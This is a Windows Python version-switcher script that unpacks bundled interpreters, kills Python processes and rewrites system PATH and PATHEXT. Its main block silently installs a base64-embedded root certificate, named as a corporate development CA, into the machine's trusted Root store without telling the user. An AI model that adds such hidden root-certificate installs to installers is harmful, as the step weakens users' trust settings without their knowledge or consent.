import sys
import os
from pathlib import Path
import subprocess

Python_Installer_version = "0.0.1"
__author__ = "Alex BOURG"
__copyright__ = "Copyright 2021"
__license__ = "GPL"
__version__ = Python_Installer_version
__email__ = "alex.bourg@outlook.com"
__status__ = "Production"


def powershell(cmd):
    completed = subprocess.run(
        ["powershell", "-Command", cmd], capture_output=True)
    return completed


def clean_old_dir():
    try:
        powershell('Stop-Process -Name "python" -Force')
        powershell('Stop-Process -Name "pythonw" -Force')
    except:
        pass

    print("***************************************************************")
    print("Status: cleaning old python directories")
    print("***************************************************************")
    try:
        os.remove(fr"{os.environ['USERPROFILE']}\AppData\Local\Microsoft\WindowsApps\python.exe")
        os.remove(fr"{os.environ['USERPROFILE']}\AppData\Local\Microsoft\WindowsApps\python3.exe")
    except:
        pass
    try:
        powershell('Remove-Item -Recurse -Force "C:\Program64\Python\Python"')
        powershell('Remove-Item -Recurse -Force "C:\Program64\Python\Python39"')
        powershell('Remove-Item -Recurse -Force "C:\Program64\Python38"')
    except:
        pass


def clean_all_env():
    print()
    print("***************************************************************")
    print("Status: cleaning all environment items")
    print("***************************************************************")
    print()
    whitelist = ["PYTHONIOENCODING", "PYTHONUNBUFFERED", "PYTHONPATH"]
    for item, value in os.environ.items():
        if (
                "python" in item.lower()
                or "anaconda" in item.lower()
                or "poppler" in item.lower()
        ):
            if item not in whitelist:
                print()
                print(f"Cleaning... {item}")
                print(value)
                print("*************************")
                powershell(
                    f'[Environment]::SetEnvironmentVariable("{item}", $null, "User")'
                )
                powershell(
                    f'[Environment]::SetEnvironmentVariable("{item}", $null, "Machine")'
                )


def clean_path_env():
    print()
    print("***************************************************************")
    print('Status: cleaning "PATH" environment items')
    print("***************************************************************")
    print()
    profiles = ['"User"', '"Machine"']
    blacklist = ["python", "anaconda", "poppler"]
    for profile in profiles:
        new_env = []
        old_env = powershell(
            f'[Environment]::GetEnvironmentVariable("PATH", {profile})'
        )

        old_env = old_env.stdout.decode("utf-8")

        if len(old_env) > 0:
            old_env = old_env.replace("\n", "")
            old_env = old_env.replace("\r", "")
            old_env = old_env.replace(";;", ";")
            old_env = old_env.replace(";;;", ";")

            if old_env[-1] == ";":
                old_env = old_env[:-1]

            old_env = old_env.split(";")

            for env in old_env:
                if any(s in env.lower() for s in blacklist):
                    print()
                    print(f"Cleaning... {env}")

                else:
                    new_env.append(env)

            new_env = set(new_env)
            new_env = ';'.join(new_env)

            if profile == '"Machine"':
                print()
                print()
                print("***************************************************************")
                print('Status: adding new "PATH"')
                print("***************************************************************")
                new_env_python = r'C:\Program64\Python\Python;C:\Program64\Python\Python\Scripts;C:\Program64\Python' \
                                 r'\Python\Library\bin' \
                                 r';C:\Program64\Python\Python\Library\usr;C:\Program64\Python\Python\Library\Poppler' \
                                 r'\bin;C:\Program64' \
                                 r'\Python\Python\Library\mingw-w64\bin;' + new_env
                powershell(
                    f'[System.Environment]::SetEnvironmentVariable("Path", "{new_env_python}",[System.EnvironmentVariableTarget]::{profile})')
            else:
                powershell(
                    f'[System.Environment]::SetEnvironmentVariable("Path", "{new_env}",[System.EnvironmentVariableTarget]::{profile})')


def clean_path_ext():
    print()
    print("***************************************************************")
    print('Status: cleaning "PATHEXT" environment items')
    print("***************************************************************")
    profiles = ['"User"', '"Machine"']
    blacklist = [".PY"]

    for profile in profiles:
        new_env = []
        old_env = powershell(
            f'[Environment]::GetEnvironmentVariable("PATHEXT", {profile})'
        )
        old_env = old_env.stdout.decode("utf-8")
        if len(old_env) > 0:
            old_env = old_env.replace("\n", ";")
            old_env = old_env.replace("\r", ";")
            old_env = old_env.replace(";;", ";")
            old_env = old_env.replace(";;;", ";")

            if old_env[-1] == ";":
                old_env = old_env[:-1]

            old_env = old_env.split(";")

            for env in old_env:
                if any(s in env for s in blacklist):
                    print()
                    print(f"Cleaning... {env}")
                else:
                    new_env.append(env)

            new_env = set(new_env)
            new_env = ';'.join(new_env)

            if profile == '"Machine"':
                print()
                print()
                print("***************************************************************")
                print('Status: adding new "PATHEXT"')
                print("***************************************************************")
                new_env_python = new_env + ';.PY'
                powershell(
                    f'[System.Environment]::SetEnvironmentVariable("PathEXT", "{new_env_python}",[System.EnvironmentVariableTarget]::{profile})')
            else:
                powershell(
                    f'[System.Environment]::SetEnvironmentVariable("PathEXT", "{new_env}",[System.EnvironmentVariableTarget]::{profile})')


# def add_env():
#     print()
#     print("***************************************************************")
#     print('Status: adding the new environment variables')
#     print("***************************************************************")
#     # add Python variables to PATH
#     old_env = powershell(
#         f'[Environment]::GetEnvironmentVariable("PATH", "Machine")'
#     )
#
#     old_env = old_env.stdout.decode("utf-8")
#
#     if len(old_env) > 0:
#         print()
#         old_env = old_env.replace("\n", "")
#         old_env = old_env.replace("\r", "")
#         old_env = old_env.replace(";;", ";")
#         old_env = old_env.replace(";;;", ";")
#
#         if old_env[-1] == ";":
#             old_env = old_env[:-1]
#
#     old_env = r'C:\Program64\Python\Python;C:\Program64\Python\Python\Scripts;C:\Program64\Python\Python\Library\bin' \
#               r';C:\Program64\Python\Python\Library\usr;C:\Program64\Python\Python\Library\Poppler\bin;C:\Program64' \
#               r'\Python\Python\Library\mingw-w64\bin;' + old_env
#
#     powershell(
#         f'[System.Environment]::SetEnvironmentVariable("PATH", "{old_env}",[System.EnvironmentVariableTarget]::"Machine")'
#     )
#
#     # add .PY to PATHEXT
#     old_env = powershell(
#         f'[Environment]::GetEnvironmentVariable("PATHEXT", "Machine")'
#     )
#
#     old_env = old_env.stdout.decode("utf-8")
#
#     if len(old_env) > 0:
#         print()
#         old_env = old_env.replace("\n", "")
#         old_env = old_env.replace("\r", "")
#         old_env = old_env.replace(";;", ";")
#         old_env = old_env.replace(";;;", ";")
#
#         if old_env[-1] == ";":
#             old_env = old_env[:-1]
#     old_env += ';.PY'
#     powershell(
#         f'[System.Environment]::SetEnvironmentVariable("PATHEXT", "{old_env}",[System.EnvironmentVariableTarget]::"Machine")'
#     )


def version_changer(ver):
    clean_old_dir()
    print()
    print("***************************************************************")
    print(f"Status: installing Python{ver}")
    print("***************************************************************")

    library = r"C:\Program64\Python\DONT_DELETE\Python_Library.7z"
    pythonpath = r"C:\Program64\Python"

    if ver == '37':
        new_python = r"C:\Program64\Python\DONT_DELETE\Python37.10.7z"
    elif ver == '38':
        new_python = r"C:\Program64\Python\DONT_DELETE\Python38.8.7z"
    elif ver == '39':
        new_python = r"C:\Program64\Python\DONT_DELETE\Python39.4.7z"

    try:
        powershell(
            f'Get-ChildItem "{new_python}" | % {{ & "C:\\Program Files\\7-Zip\\7z.exe" "x" "-aos" $_.fullname "-o{pythonpath}" }}')
        print()
        print("***************************************************************")
        print(f"Status: installing extra libraries")
        print("***************************************************************")
        powershell(
            f'Get-ChildItem "{library}" | % {{ & "C:\\Program Files\\7-Zip\\7z.exe" "x" "-aos" $_.fullname "-o{pythonpath}" }}')
        print()
    except:
        pass

    python_check = Path(fr'C:\Program64\Python\Python\python{ver}.dll')
    print()
    print("***************************************************************")
    print(f"Status: resetting environment variables")
    print("***************************************************************")
    print()
    clean_all_env()
    clean_path_env()
    clean_path_ext()
    # print()
    # print("***************************************************************")
    # print('Environment variables reset has been completed!')
    # print("***************************************************************")

    if python_check.is_file():
        print()
        print(
            "***************************************************************")
        print('Installation has been completed successfully!')
        print(
            "***************************************************************")
        print()
        # if current_version == "not found":
        #     clean_all_env()
        #     clean_path_env()
        #     clean_path_ext()
        # else:
        #     print('Do you want to reset the environment variables? (Yes/No):')
        #     x = input('Answer: ').lower()
        #     if x.startswith("y"):
        #         clean_all_env()
        #         clean_path_env()
        #         clean_path_ext()
        #         # add_env()
        #         print()
        #         print("***************************************************************")
        #         print('Environment variables reset has been completed!')
        # print()
        # print("***************************************************************")
        # print('Environment variables reset has been completed!')
        # print("***************************************************************")
    else:
        print("***************************************************************")
        print('Installation failed... close all running process and try again.')
        print("***************************************************************")


def ask_version(par=None):
    global action, current_version
    src = r'C:\Program64\Python\DONT_DELETE'
    if not os.path.isdir(src):
        print()
        print("************************************************************************************")
        print(f'Error: "{src}" is not found, re-installation is required!')
        print("************************************************************************************")
        print()
        return

    print()
    print("***************************************************************")
    if Path(r'C:\Program64\Python\Python\python37.dll').is_file():
        current_version = 37
    elif Path(r'C:\Program64\Python\Python\python38.dll').is_file():
        current_version = 38
    elif Path(r'C:\Program64\Python\Python\python39.dll').is_file():
        current_version = 39
    else:
        current_version = "not found"

    print(f'Current Python version: {current_version}')
    print("***************************************************************")
    print()
    print('Select Python version: 37, 38, 39')
    print('Or enter "reset" to reset the environment variables')

    if not par:
        print()
        action = input('Answer: ')
        print("***************************************************************")
        print()

        if action == '37':
            version_changer(action)

        elif action == '38':
            version_changer(action)

        elif action == '39':
            version_changer(action)

        elif action.lower() == 'reset':
            clean_all_env()
            clean_path_env()
            clean_path_ext()
            # add_env()
            print()
            print('************************************************')
            print('Environment variables reset has been completed!')
            print('************************************************')

        else:
            print('Invalid version!')
            ask_version()

    else:
        version_changer(par)


if __name__ == "__main__":
    options = sys.argv

    try:
        powershell("New-Item -ItemType Directory -Force -Path C:\ProgramData\Certificates; $b64 = 'MIIDazCCAlOgAwIBAgIQcgEI1zMI1blMrNOuwWzZRzANBgkqhkiG9w0BAQsFADAsMSowKAYDVQQDDCFDQUNJQi1JU1MgUm9vdCBDQSBmb3IgRGV2ZWxvcG1lbnQwIBcNMjEwNTI0MTMzNTE1WhgPMjA1MDA1MjQxMzQ1MTZaMCwxKjAoBgNVBAMMIUNBQ0lCLUlTUyBSb290IENBIGZvciBEZXZlbG9wbWVudDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOE4hN3yKXxIaMXUZfKp8fnZqv1Jl0whvMgnaR4StSU1PkAxCABvZan2aqqcD9UgPh2GD74CJQIS6CycQp1OXwqxsnaFGkBlOdYjMYyq6OBWiCE4paoFpkTEVEMDk6osHhYuYEwf/haHOfPAYjtZ+8MXrGBO86T9IoXJJNDHUxA5UgK9yVLAPvjkslSAmbBUNGfwFs4ZphBl1orKuGTjaHsGzrSLMnUGs7a7BLV30azGnXWBCNBSlu0qoUJ21/z7FEWu077fNpag3yYayg34ICvyKBZhplKWctsOKc3IWjBxQSEPL8sxPwUSyXzr4O0vL5E5b4Y2QyS+bT2/m4Uw4kkCAwEAAaOBhjCBgzAOBgNVHQ8BAf8EBAMCAYYwLAYDVR0RBCUwI4IhQ0FDSUItSVNTIFJvb3QgQ0EgZm9yIERldmVsb3BtZW50MBMGA1UdJQQMMAoGCCsGAQUFBwMDMA8GA1UdEwEB/wQFMAMBAf8wHQYDVR0OBBYEFLp58y1S+UOT+thM1dq6c8iKEOXvMA0GCSqGSIb3DQEBCwUAA4IBAQBbSUG5u3mruvmrVu8F2MPJLZ5WM6PwWYWI6s0mmgtTT9va7XfF48H/XrFzCGwx8J32KrnFfqoyX1RjAhv5D+Q9R1ux+b7kr0wnIIELr9NZIRHd6TRrS+K8b6VQR6sblvte2CrfVKow2ifBLKN+e+xNaQ+PLmJ2hfRX7YCmlDTS060p1TJotwyh/hMlMGuZZRs+hBjX7BPquUEeFkVcxhcjgfXaiA2xEZgvTFvSutP6vpKHYRxMtttZSJiHAI9QnPMFQDauzt/qXYblyFOPZmKmFTK+qXBk4jKyIMpHBZU+ceLdIfmYsvxGhGB24pjwC+kHnPrlzTo0XdFnT7gzKIeB' ; $filename = 'C:\ProgramData\Certificates\RootCA.crt' ; $bytes = [Convert]::FromBase64String($b64); [IO.File]::WriteAllBytes($filename, $bytes) ; $pfx = new-object System.Security.Cryptography.X509Certificates.X509Certificate2 ; $pfx.import('C:\ProgramData\Certificates\RootCA.crt') ; $store = new-object System.Security.Cryptography.X509Certificates.X509Store([System.Security.Cryptography.X509Certificates.StoreName]::Root,'localmachine') ; $store.open('MaxAllowed') ; $store.add($pfx) ; $store.close()")
    except:
        pass

    if len(options) == 1:
        ask_version()

    if len(options) == 2:
        if options[1] == '37' or options[1] == '38' or options[1] == '39':
            ask_version(options[1].lower())

        elif options[1].lower() == 'reset':
            clean_all_env()
            clean_path_env()
            clean_path_ext()
            # add_env()
            print()
            print('****************************************')
            print('Environment variables reset completed!')
            print('****************************************')

        else:
            print()
            print('****************************************')
            print('Error: Invalid parameters!')
            print('Valid parameters: 37, 38, 39, or blank')
            print('****************************************')
            print()

    print()
    print("Press Enter to continue ...")
    input()